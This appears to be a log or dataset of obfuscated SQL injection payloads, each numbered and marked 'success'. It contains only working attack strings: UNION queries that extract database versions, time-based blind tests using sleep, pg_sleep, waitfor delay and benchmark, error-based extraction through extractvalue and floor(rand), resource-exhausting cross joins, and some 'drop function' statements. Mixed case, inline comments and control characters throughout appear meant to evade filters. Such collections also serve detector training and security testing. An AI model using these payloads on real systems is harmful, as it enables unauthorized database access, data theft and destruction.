727 success 'sELeCt   (  cAsE WHEn/**/  (  5418   LikE   6516  )   theN 1 eLSE 0x152a*  (  SEleCt (selECt 5418) FrOM master..sysdatabases  )   eNd  ) /**/-- '
738 success '0x1c% '
741 success '1 wHErE 2229 like/**/2229 '
743 success '-2817  )   whERe\n1212  =  1212 OR 3266   LIKE   (SELECT 1102) '
746 success 'SeLecT cAse WHEn 3661   Like   9315 then 1 ElSE null ENd--\x0c'
749 success '1  )   WHeRE 9344   LIKE   9344 '
752 success "/**/select * from users where id   LIKE /**/ '1' ||/*O.\\*/\\<$ union select 1,@@VERSION -- (SELECT 0x1)' "
754 success "-2120'  )   Or 0x221e   like   8844#\n"
759 success "0x1'||/*c'DdE*//**/(/**/ seLeCt 'zyvk'\tFROm dual WHEre\x0b0x818   LIKe  \x0c0x818 "
762 success ' SElect * froM users WHERe id   LIKE   1 Or "  (  _" or \'e;\'<>\'e;[\' AND 1556!=1557 -- 0x1 '
764 success '0x1  )   As ghew wHeRE\x0b0x1929/**/ =  6441 union all SeLecT null,null-- '
765 success "0x1'/**/ )  /*>ilJD*/whERe\xa07750=(SeLecT 7750) "
774 success 'sElECt   (  CasE WheN   (  3863   lIke   1151  )   thEn 3863 eLse/**/cast  (  1 aS int  )  /  (  sEleCt 0 fRom dual  )   end  )   fRoM dual-- '
777 success '(SELECT/*eXr*/1)  ) \x0c wHere 7096   LIKe   0x1bb8 '
779 success "-0x197f'/*[,j3*/  )    )\x0b   union all SeleCt 0x13bd,5053,5053,0x13bd-- U#"
780 success 'if  (  1928   LiKE   4811\t )   sELECt 1928 ElSE Drop function ucko-- _L`7c'
781 success ' (  sELEct   (  cASe WHEN   (  4108/**/  LIKE   4108  )   THen 0x1 elSE 4108*  (  SELECT 4108 froM information_schema.character_sets  )   enD   )    )  '
782 success "waitfor delay/*KO*/'0:0:5' And   (  437 IN (436,437,438) oR 0 "
785 success "0x1,  (  sEleCT   (  CASe whEn   ( \x0b9644 NOT LIKE 0x25ad Or '(\r(SELECT 4)' liKe '(\r4,'  )   THEn 1 eLse 1/  (  SelECt 0x0  ) /**/ END   )    )    "
788 success 'seLEct * fROm users wHEre id   lIKe   1 + $+%0x1 OR 0x1011 IN (4112,0x1011,4114) --/**/1 T'
789 success 'iif/**/ (  7011 \t lIkE   0x9da,1,1/0  )   '
790 success '1 AnD 0x196e/**/  LIKE     (  SeLeCt count  (  *  )   FRom sysusers As sys1,sysusers AS sys2,sysusers aS sys3,sysusers As sys4,sysusers AS/*0*/sys5,sysusers\x0cAs sys6,sysusers aS sys7  )  -- ixlk '
796 success ' SElEcT * FrOm users WHERe id   LIKE   1 or ";[" oR 0x1  =  1 AND True -- 1 #'
798 success "-2223'\x0c  )    )    As mjwp WhERe 8650  =  8650 oR 7900   LiKE   5838 "
802 success '1 where 0x8fd  =  0x8fd OR 7830<>0x1e96 '
805 success "0x1,exp  (/**/ ~  (  seLeCt * frOm   (  selEct concat  (  0x7171706a71,  (  sELeCT   (  elt  ( /*W2t/d*/1745<>1746 OR 0 AND True AND 1 AND 'QX' NOT LIKE 'QX@',1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    "
806 success 'sELECt count  (  *  )   fRoM sysibm.systables As t1,sysibm.systables AS t2,sysibm.systables As/**/t3-- a,'
810 success "0x1' wHEre/**/2737/**/NOT LIKE 2738 "
816 success "1'/*?;aq*/and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  ( /**/500000000/2   )    )      )    ) \x0c  and 'imqi'  =  'imqi "
818 success '1 AnD elt/**/ (  4430<>4431 oR False And 0x2104<>8453,sleep  (  0x5   )    )   # macc |'
822 success 'iif  (  0x116c   LIke   1610,1,1/0x0  )   '
823 success ' SElECT * FROM users WhERE id  =  1 OR\x0c@#",  =  1 union SeleCT 1,version  (    )   -- 1 '
827 success '0x1"  )   AS tnux wHeRE 2641 IN (2640,2641,2642) OR \'(SELECT 651)+\'!=\'651+\' AND 1 AnD 1/**/oR\n0x0 oR \'\r\'=\'\rr\' rlike  \t(  SeLecT * fROm   (  sELEct  (  sleep  (  5   )    )     ) /*\x0b{9j-*/vwyq  )  # M+,sJ8'
829 success 'seLEcT CasE WHen\x0b2599   lIKe   7035 TheN 1 ElSe null enD-- c'
830 success "SElECt count  (  *  )   FRom domain.domains As t1,domain.columns aS t2,domain.tables As t3 &&    (    (   'zaru'   LIKe   'zaru "
831 success '-6731" where 3033 NOT LIKE 3034 AND 4076<>4077 union all select 6166,6166,6166,6166,6166,6166-- Y'
834 success '1" WHere 2619  =  2619\x0canD True && 2823   Like   5100# '
838 success ' seLECT * frOm users wheRe id   LIKE   1 OR @#"{  =  1 oR 1  =  1 -- 0x1 '
840 success '\nSeleCt * fRoM users/*D4LQ*/WHERE id  =  (SeleCT 0x1). union SELect null,version  (    )   -- 0x1 65'
846 success "0x1'+  (  select 'sacd' WHERE 5984   LIKE  /*7-$:E*/5984\t&& True union all SElEcT null,null,null,null,null,null,null# !/"
851 success "1'\nWHEre 4155 IN (4154,4155,4156) OR 6793  =    (  SELect 6793 From pg_sleep  (  5 \x0c )    )   -- 45"
852 success 'selEct count /**/(  *  )   FroM rdb$fields AS t1,rdb$types AS/**/t2,rdb$collations AS t3,rdb$functions As t4 anD    (    (     (  "dskh"   like   "dskh '
855 success 'selECT count  (  *  )   fRoM sysibm.systables as t1,sysibm.systables/*8]*/AS t2,sysibm.systables as t3 &&    (    (/**/  "%"   Like   " '
858 success 'iif/*,IWD*/ (  4638  =  8258,1,1/0 /**/)   '
860 success "1'+  (  SelECt eluw wHErE 7267 iN (7266,7267,7268) "
863 success ' seleCt * fROM users wHERE id   like   1 *\\.\x0cunion SelEcT null,@@VERSION -- 0x1 '
865 success ' sELECt * FROm\tusers WHeRe id  =  1 or 1#"? union seLeCT \'a\',version  ( /**/  )\x0c\t -- 1 M~'
868 success '-9958"  )   AS jzvq whERE 3741  =  3741 OR False union all seLEct 3741,3741,3741# '
870 success 'SElEct count  (  * \x0c)   froM sysibm.systables AS t1,sysibm.systables\x0caS t2,sysibm.systables aS t3 And   (  "lsvg" lIKE "lsvg '
880 success "-9739' or 8571   like   8571-- h/"
883 success '0x1  )   as tbve WHeRe 4828 \xa0=  (SeLect 4828) '
884 success "1'\xa0iN boolean mode  )   &&/**/2388   lIKE   benchmark  (  5000000,md5  (\t 0x6d457153   )    )   # "
885 success 'iif  (  4216 LIKE 4216,1,1/0 \n)   '
888 success 'SelECT   (  cASe When   (  8978   liKe   1426  )   THEN 1 eLse 8978*/**/ (  seLEcT 8978 fRoM master..sysdatabases  )   END  )  -- F'
889 success '0x1   ) \t  )    aS gxvp wHerE 3865   like   0xf19 '
890 success '-7395%"/*y5\x0bq*/order by 1-- '
892 success "-1236'+/*Eu*/ (  select 'fbgh' where 'I6' NOT LIKE 'I63' union all sELECt/**/3896,3896,3896,3896,3896,0xf38,0xf38,(SElECt 3896),3896--\nO"
895 success "-8521'+  (  SEleCt ucim Where '_' NOT LIKE '_R' union all SeLECT 9003-- T+"
897 success ' SELecT *\x0bfrom users WhERe id   LIke   0x1 +\\. union SELEct null,@@VERSION -- (SELECT 1) -'
901 success "1'+  (  select/**/'xqjx'\tWHERE 6961 NOT LIKE 6962 or 0 && 9198\xa0 =\t 9198-- "
903 success 'sELEcT   (  CasE WhEN   (  3537   Like  /*I{_`*/5218  )   thEN 3537 ELsE 3537*  (  sELeCT 3537 FrOM mysql.db  )   End  )  # '
908 success '-5751 /**/)   as jybu where 4739   like   4739 or 2724 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  2724  =  0xaa4  )   then char  (  0x31  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  -- '
911 success '  (  sElECt count/**/ (  *  )\t  FRoM sysibm.systables AS t1,sysibm.systables AS t2,sysibm.systables aS t3  )   '
913 success 'or/**/1 IN   (  SelEcT @@version  )  -- '
914 success 'select case/*Ix*/when 7634   like   3954 then 1 else null end-- '
917 success ' sELECT * FRom users whErE id   like   1.<1# union select 1,version  (    )   -- 1 '
921 success '1  )   WHErE 0x1b72   LIKE   0x1b72 '
923 success "SELect count/**/ ( /**/* /**/)   fRom rdb$fields As t1,rdb$types aS t2,rdb$collations as t3,rdb$functions As t4 and   ( /*/hA*/'n'<>'nz' aNd True "
932 success '0x1 where 2382   like   0x94e '
935 success "/**/or uname like '%\x0c"
941 success 'SELeCt dbms_pipe.receive_message/**/ (  chr  (  0x42  )   || chr /**/(  67  )   oR chr  (  79  )   Or chr  ( /**/101  )  ,(SELECT 5)  )   FrOM dual aND    (   /**/(   "gydr" LIkE "gydr '
942 success "SelEct count/**/\x0b(  *  )  /*+*/fRoM generate_series  (  1,5000000  )  \x0bAnd 'roca'   LIKE   'roca "
944 success "-9358' or 9887 \x0b LIKE \n 2569--/**/0\x0b"
947 success '0x1" /**/)  \tAs dgzf wheRe 0x12e2   LIKE   (SElECt 4834) '
948 success "0x1'\x0cand/**/'y'!='y,'--\x0b"
950 success "1' wHere 1450 likE 1450 && make_set  (  's' NOT LIKE 's#',8899  )  -- "
952 success 'sELect count/**/\x0c(  *  )   FROm domain.domains As t1,domain.columns as t2,domain.tables As t3 ANd "%"  =  " '
953 success "waitfor/**/delay '0:0:5'/**/"
955 success ' Select * FrOm users wHeRe id  =/**/ 1 OR @#";  =  (SeLect 1) oR 5041!=5042 And 9217=9217 -- 1 %Un'
959 success '-8868" \xa0)  /**/where 9674 NOT LIKE 9675 union/**/all select/**/5681,5681,5681,5681,5681,5681,5681,5681,5681,5681-- f'
966 success "a'/**/-- v3"
969 success '0x1"  )   AS xwnu wheRe \'t\' NOT LIKE \'t3\' union all selecT null,null,null,null,null,null-- '
970 success 'SelEcT   (  cASE/*V-aS*/wheN   (\x0c 6166   LikE   0xd24  )   ThEn 6166 ElSe cast  (  1 aS int  )  /  (  SELEct 0 FRom dual  )   eND  )   frOM dual-- '
974 success "-(SELECT 7501)'+  (/**/ select uloc where 9809 like 9809 OR 0 union all select 3089,3089,3089,3089,3089,3089,3089,3089,3089,3089-- "
975 success 'SELEct   (  CASE WHen   (  8331  =/**/ 5625  )   ThEn 8331 eLsE 8331*  (  SELeCT 8331 FRom mysql.db  )   eNd  )  # '
977 success '0x1 aND sleep  (  0x5  )  # P'
979 success 'SELeCt pg_sleep  (  0x5  )   anD "zhsc" /*8*/ LIKE   "zhsc '
980 success 'seLecT benchmark  (  0x4c4b40,md5/*c`imD*/ (  0x4c4d6142   )    )  \t# idxq '
988 success 'SELEcT   (  caSe WhEn   (  9030  = \t9185  )   thEn 9030 ELse 9030*  (  SEleCt 9030 FrOm information_schema.character_sets  )   END  )  # }|'
990 success "0x1'+  (  select dklj where 2157 IN (2156,2157,2158) AND 1 "
993 success "0x1'/*:xr`*/\xa0)  \x0bwhere '\\-2N'<>'\\-2NQ' "
995 success "1'\x0b )   WheRE/**/1115   like   1115 "
1000 success '0x1 whErE 0x20ce   like   8398 '
1005 success "END  AnD     (\xa0  /**/(  \t  (  'xzbk'  =  'xzbk "
1011 success '-0xcf9" WHerE 6056=0x17a8 Or \'TM\' NOT LIKE \'TM\'/*WU4*/union all\tSElECT 1603,1603,(SELEcT 1603),1603# Yy'
1012 success 'If  ( \x0c8995  =  9787  )/**/  sElecT 0x2323 ELse dROp function ofgg-- '
1017 success '-0x234d%" union/**/all SelEcT 0x19b7# yxeE'
1018 success "-0x669' union\x0call/**/SELEcT 0x12e3# \t+Qa"
1020 success "1  )   AS ekgx WhErE 9923   LIKE   9923 And 6706 LIkE 6706 or 8384  =  LiKE  (  'abcdefg',upper  (\x0b hex  (  randomblob/*\\CV}*/ (  500000000/2   )    )      )    ) /**/ -- Rg"
1021 success "1'\xa0 )    OR  4915   LikE  \t  (  Select count  (  *  ) \xa0 from domain.domains AS t1,domain.columns aS t2,domain.tables aS t3  )  -- "
1022 success 'elt  (  2567   LIKE   9921,9921  )   '
1025 success '0x1  )   As hlit wHERe 5296 IN (5295,5296,5297) && \'zZ"e\'\' NOT LIKE \'zZ"e\'s\' oR 0x0 procedure analyse  (  extractvalue  (  9627,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x4b774c75 /**/ )\n   )   \xa0  )    )     )  ,1  )  # ;p'
1028 success 'SelEcT   (  CAsE when   (  9246   like   0x18b6  )   then 9246 Else 9246*  (  sElEcT 9246 fRom mysql.db  )   END  )  # <'
1033 success "SeleCt count  (  *  )  \x0bFRoM/**/sysibm.systables\x0bAs t1,sysibm.systables as t2,sysibm.systables AS t3  )  +' "
1038 success "1'/**/ )   AND 3976<>3977\x0c"
1039 success "sELeCt count/**/ (  *  )   From all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  +' "
1041 success 'selecT   (  CASE WheN   (  0x12ac   liKe/**/  (sElECT 4432)  )   THeN 4780 ElsE (sELECt (seLEcT 4780))*/**/ (  seLeCT 4780 FRom mysql.db  )   enD  )  # k'
1043 success "0x1' rlike/*^uO^N*/sleep \t(  0x5  )  "
1044 success 'Select   (  CaSe wHen   (/**/ 7822  =  4430  )   ThEn\n7822 ELSe 1/  (  SeLecT (seLeCT 0)  )   end  )  -- t'
1051 success '-9535"/**/order\x0bby\xa01--\n'
1053 success " sELEcT * frOm users WHerE id\x0b = \n'0x1' union/**/selEcT \\.#,@@VERSION -- (SELECT 0x1)' "
1054 success "0x1'  )   as noqp whERe 3648<>3649 AND True or 0x207b /**/=    ( \tSeleCt count/**/ (/**/ *  )   fRom sysibm.systables as t1,sysibm.systables As t2,sysibm.systables As t3  )  -- "
1056 success 'SeLeCT caSe WhEn 8227   LIKE   1229 THEN 1 eLse null/**/end-- '
1060 success " SELeCT * fRoM users wheRE id  =  '1' Or ||/1  =  1 union SElect 1,version  (    )   -- 1'\x0c"
1063 success "selECt * frOM users/**/WHErE id  = \n1 <@. oR 'Lv'<>'Lv0' aND '\t1*' LIkE '\t1*' -- 1 "
1064 success '-4305  /**/) /**/  )     )   union/**/all seLeCT 2401,2401-- '
1067 success '-5322"\x0cunion all/*Rp`X*/SElecT\n6494,6494,6494,6494,6494,6494--\n\rf'
1068 success '1" WHERE 0x20c3/*\rot\rU*/  LIKE   8387 AND True\n'
1069 success '-0x141b Or   (  8459   lIkE   8459  )  *0x132a '
1078 success '1/**/ )   WhErE\x0c995 IN (994,995,996) '
1080 success "/**/Or/*w\x0br2z*/'1'   \x0cliKE    '1\t"
1081 success "-4032'/**/ )   WHERe/**/5157 /**/=  5157 ||\x0c1809\t =  2810# U5"
1083 success "0x1' OR row  (  1045,7562/*G8>V#*/ )  >  (  sELeCt count  (  *  )  ,concat  (  0x7171706a71,  (  sELECT   (  elt  (  1045   like /*.P*/ 1045 OR 0,1\n  )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x FRom   (  SELeCt 8488 union SELecT 5584 union SElect 3051 union SelECT 1210  )  a group by x  )   "
1091 success "0x1'+  (  select 'dhcv' WHERE 0x249c   LIke   0x249c\n"
1100 success "-0x1a4d'  )   WHerE 4024   lIke  \x0c4024 aNd 0x22f3!=8948\x0cunion all SeLeCt 0xfb8,4024,0xfb8,0xfb8# sz"
1101 success '-7466 where 5161/**/ =  5161 or 3038  = \xa03038 AND True '
1103 success 'selEct * FroM users WherE id  =  (SEleCT 1) +  \xa0(  $+  )   oR 1  =  1 -- 1 '
1107 success '0x1  )   AS cinw WHErE 3732   LIKE   3732 AnD 8594  =    (  SeLecT 8594 From/*P0}*/pg_sleep  (  0x5   )    )   -- :D'
1110 success 'SELecT /**/ (  cASE wHen   (  7163   liKe   1777  )   ThEn 1 ELSe 7163*  (  SelECt 7163 fROm master..sysdatabases /**/)   EnD  )  -- '
1117 success '-0x174b"/**/OR 9323\x0c =  0x246b AND True# 1'
1123 success "-1602'\tor '_e4N' LIKE '_e4N' "
1124 success 'SELecT caSE/**/wHen (SeLeCt 2930)  =  0x1f1c ThEN 0x1 ELSe null End-- '
1125 success '0x1 AnD 5556 /**/ LIKE     (  SElECT count  (/**/ */**/ )   FRom all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )\x0b --/**/gynj '
1126 success 'SElEcT   (  CAse WHen   (  5740  /**/LIkE   7636  )   THEN (SeLeCt 5740) elSE\ncast /**/(  0x1 As int  )  /  (  SElEcT 0x0 froM dual \t)   eNd  )   From dual-- '
1129 success "-9657'  )   aS ziiq wherE 7725 /**/=  7725 AND 4914 LIKE 4914 OR False or 3038  =  3038 "
1135 success '-8933  ) \n as iiyr where/**/4957<>4958 OR 0 union all select 1974,1974,1974,1974,1974# '
1139 success "1' WhErE 4245/*O`Z>*/  LIKe  /*Tw*/4245 union all seLECT null,null-- 9b"
1140 success '\x0beND &&\t   (    (   "%"  =  " '
1143 success 'iif  (  1217   LIKE   8831,1,1/0  )   '
1144 success ' selECT * fRoM users WHErE id  = \n1 oR "?  (  " oR 1   like  /**/1 -- 1 ?'
